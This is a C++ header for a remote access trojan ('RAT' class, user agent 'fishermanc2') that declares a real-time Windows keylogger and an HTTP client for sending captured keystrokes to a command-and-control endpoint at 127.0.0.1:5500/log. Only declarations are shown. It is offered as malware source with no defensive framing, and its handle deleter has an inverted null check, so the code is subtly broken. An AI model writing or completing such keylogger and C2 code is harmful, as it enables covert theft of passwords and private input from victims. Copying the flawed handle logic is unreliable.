#pragma once

#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <queue>

#pragma comment(lib, "winhttp.lib")

#define DEFAULT_HTTP_VERSION NULL
#define RESERVED NULL

namespace HTTPInfo {
	static const std::wstring FISHERMAN_USER_AGENT(L"fishermanc2/1.0");
	static const std::wstring TEMP_SERVER_NAME(L"127.0.0.1:5500");
	static const std::wstring REQUESTED_RESOURCE(L"/log");
	constexpr int ZERO_LENGTH = 0;
	constexpr int NO_FLAGS = 0;
	constexpr int NO_CONTEXT = 0;

	namespace Methods {
		static const std::wstring GET(L"GET");
		static const std::wstring POST(L"POST");
	}
}

namespace Keylogging {
	constexpr int ALL_THREADS = 0;
	constexpr int MAX_LENGTH_OF_TRANSLATED_MESSAGE = 10000; // Can be changed, seems more than enough,
	constexpr int TRANSLATE_KEY_BREAK_SCAN_CODES = 1;
	constexpr int BUFFER_SIZE = 1000; // Send response each kb
}

struct HINTERNETDeleter {
	typedef HINTERNET pointer;

	void operator()(HINTERNET h) {
		if (!h) {
			WinHttpCloseHandle(h);
		}
	}
};

using HINTERNETWrapper = std::unique_ptr<HINTERNET, HINTERNETDeleter>;

LRESULT CALLBACK parseAndUpdateSendQueue(int nCode, WPARAM wParam, LPARAM lParam);

class RAT {
public:
	RAT() = default;
	~RAT();
	void startRealtimeKeylogger();
	void stopRealtimeKeyLogger();
	void flushKeyloggedMessage();

private:
	HHOOK _keyLoggerHook;
	HINTERNET _hSession;
	HINTERNET _hConnect;
};